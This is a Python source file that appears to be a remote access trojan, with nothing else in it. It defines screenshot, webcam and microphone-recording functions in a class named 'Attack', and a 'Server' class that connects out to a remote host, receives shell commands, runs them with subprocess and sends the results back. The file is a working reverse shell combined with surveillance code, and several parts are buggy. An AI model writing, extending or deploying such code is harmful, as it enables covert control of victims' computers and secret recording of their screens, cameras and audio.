import pyautogui
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
import sounddevice as sd
import soundfile as sf
import wavio as wv
import socket
import os
import subprocess
import sys


    

    

    
class Attack:
    def __init__(self, name, description, func):
        self.name = name
        self.description = description
        self.func = func
    def screenshot(filename):
        filen = pyautogui.screenshot()
        filen.save(f'{filename}.png')
    def takpic(filename):
     

        cap = cv2.VideoCapture(0) # video capture source camera (Here webcam of laptop) 
        ret,frame = cap.read() # return a single frame in variable `frame`
        
        while(True):
            cv2.imshow('img1',frame) #display the captured image
            if cv2.waitKey(1) & 0xFF == ord('y'): #save on pressing 'y' 
                cv2.imwrite(f'{filename}.png',frame)
                cv2.destroyAllWindows()
                break

        cap.release()
    def recordaudio(filename,duration):
        samplerate = 44100  # Hertz
        seconds = duration
        filename = f'{filename}.wav'
        
        myrecording = sd.rec(int(seconds * samplerate), samplerate=samplerate,
                             channels=1)
        sd.wait()
        sf.write(filename, myrecording, samplerate)
class Server:
    def __init__(self,host,port):
        SERVER_HOST, SERVER_PORT = host,port
        s = socket.socket()
        SEPARATOR = "<sep>"
        s.connect((SERVER_HOST, SERVER_PORT))
        BUFFER_SIZE = 1024 * 128
        cwd = os.getcwd()
        s.send(cwd.encode())
        def recvfile(client_socket, filename):
            filename = client_socket.recv(BUFFER_SIZE).decode()
            filename = os.path.basename(filename)
            with open(filename, 'wb') as f:
                while True:
                    bytes_read = client_socket.recv(BUFFER_SIZE)
                    if not bytes_read:
                        break
                    f.write(bytes_read) 
        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            elif splited_command[0].lower() == 'record':
                recvfile(s, splited_command[1])
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
